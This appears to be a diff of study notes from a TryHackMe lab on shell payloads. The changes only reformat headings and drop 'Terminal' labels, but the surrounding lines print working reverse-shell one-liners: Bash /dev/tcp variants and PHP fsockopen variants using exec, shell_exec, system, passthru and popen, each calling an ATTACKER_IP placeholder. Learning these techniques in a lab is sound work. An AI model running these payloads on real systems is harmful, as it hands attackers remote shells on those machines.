@@ -142,7 +142,7 @@ A Shell Payload can be a command or script that exposes the shell to an incoming
 
 Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular **reverse shell**.  
 
-#### Bash
+## ==`Bash`==
 
 **Normal Bash Reverse Shell**
 
@@ -166,7 +166,6 @@ This reverse shell creates a new file descriptor (`5` in this case)  and conn
 
 **Bash With File Descriptor 196** **Reverse Shell**
 
-
 ```shell-session
 target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
 ```
@@ -177,19 +176,15 @@ This reverse shell uses a file descriptor (`196` in this case) to establish a 
 
 **Bash With File Descriptor 5** **Reverse Shell**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```
 
 Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.
 
-#### PHP
+## ==`PHP`==
 
 **PHP Reverse Shell Using the exec Function**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
@@ -201,8 +196,6 @@ This reverse shell creates a socket connection to the attacker's IP on port `4
 
 **PHP Reverse Shell Using the shell_exec Function**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
 ```
@@ -212,8 +205,6 @@ Similar to the previous command, but uses the `shell_exec` function.
   
 
 **PHP Reverse Shell Using the system Function**
-
-Terminal
 
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
@@ -225,8 +216,6 @@ This reverse shell employs the `system` function, which executes the command 
 
 **PHP Reverse Shell Using the passthru Function**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
 ```
@@ -237,15 +226,13 @@ The `passthru` function executes a command and sends raw output back to the br
 
 **PHP Reverse Shell Using the popen Function**
 
-Terminal
-
 ```shell-session
 target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
 ```
 
 This reverse shell uses `popen` to open a process file pointer, allowing the shell to be executed.
 
-### Python
+## Python
 
 ### ﻿Please note, the following snippets below require using `python -c` to run, indicated by the placeholder PY-C  
 
